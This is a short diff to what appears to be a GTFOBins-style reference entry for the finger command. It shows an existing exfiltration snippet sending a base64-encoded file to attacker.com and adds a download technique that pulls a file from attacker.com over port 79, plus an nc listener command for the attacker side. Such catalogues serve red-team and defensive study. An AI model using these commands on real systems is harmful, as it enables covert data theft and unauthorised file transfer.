@@ -8,4 +8,10 @@ functions:
         RHOST=attacker.com
         LFILE=file_to_send
         finger "$(base64 $LFILE)@$RHOST"
+  download:
+    - description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | sudo nc -l -p 79` on the attacker box to send the file.
+      code: |
+        RHOST=attacker.com
+        LFILE=file_to_save
+        finger x@$RHOST | base64 -d > "$LFILE"
 ---
